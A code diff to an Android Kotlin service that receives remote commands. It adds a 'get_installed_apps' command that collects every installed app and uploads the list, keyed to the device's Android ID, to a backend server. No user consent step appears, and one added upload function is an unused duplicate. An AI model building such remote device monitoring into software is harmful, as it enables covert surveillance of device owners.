@@ -16,6 +16,12 @@ import okhttp3.*
 import org.json.JSONObject
 import java.io.IOException
 import java.util.concurrent.TimeUnit
+import android.content.pm.ApplicationInfo
+import org.json.JSONArray
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
+import android.content.pm.PackageManager
+
 
 class CommandService : Service() {
 
@@ -98,6 +104,12 @@ class CommandService : Service() {
                             val message = params.optString("message", "Pesan tidak tersedia")
                             showWarningUI(applicationContext, message)
                         }
+
+                        "get_installed_apps" -> {
+                            Log.d("CmdService", "Running get_installed_apps command")
+                            sendInstalledAppsToBackend(applicationContext)
+                        }
+
                     }
 
                 } catch (e: Exception) {
@@ -284,6 +296,98 @@ class CommandService : Service() {
     
         notificationManager.notify(System.currentTimeMillis().toInt(), notification)
     }
+
+    private fun getInstalledAppsAndUpload() {
+        try {
+            val packageManager = applicationContext.packageManager
+            val packages = packageManager.getInstalledApplications(0)
+            val appsJson = JSONArray()
+            
+            for (appInfo in packages) {
+                val appJson = JSONObject()
+                appJson.put("package_name", appInfo.packageName)
+                appJson.put("app_name", appInfo.loadLabel(packageManager).toString())
+                appJson.put("is_system_app", (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
+                appsJson.put(appJson)
+            }
+    
+            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            val jsonBody = JSONObject().apply {
+                put("device_id", androidId)
+                put("apps", appsJson)
+            }
+    
+            val body = jsonBody.toString().toRequestBody("application/json".toMediaTypeOrNull())
+            val request = Request.Builder()
+                .url("${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId")
+                .post(body)
+                .addHeader("Content-Type", "application/json")
+                .build()
+    
+            OkHttpClient().newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e("SendInstalledApps", "Failed to send apps: ${e.message}")
+                }
+    
+                override fun onResponse(call: Call, response: Response) {
+                    val body = response.body?.string()
+                    if (response.isSuccessful) {
+                        Log.i("SendInstalledApps", "Success: $body")
+                    } else {
+                        Log.e("SendInstalledApps", "Error ${response.code}: $body")
+                    }
+                }
+            })
+    
+        } catch (e: Exception) {
+            Log.e("SendInstalledApps", "Error: ${e.message}", e)
+        }
+    }
+
+    private fun sendInstalledAppsToBackend(context: Context) {
+        val pm = context.packageManager
+        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+    
+        val apps = JSONArray()
+    
+        for (appInfo in packages) {
+            val label = pm.getApplicationLabel(appInfo).toString()
+            val packageName = appInfo.packageName
+    
+            val appJson = JSONObject()
+            appJson.put("app_name", label)
+            appJson.put("package_name", packageName)
+            apps.put(appJson)
+        }
+    
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        val url = "${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId"
+    
+        val requestBody = apps.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+    
+        val request = Request.Builder()
+            .url(url)
+            .post(requestBody)
+            .build()
+    
+        val client = OkHttpClient()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("SendInstalledApps", "Failed to send: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    Log.i("SendInstalledApps", "Success: ${response.body?.string()}")
+                } else {
+                    Log.e("SendInstalledApps", "Error ${response.code}: ${response.body?.string()}")
+                }
+            }
+        })
+    }
+    
+    
+    
     
     
 
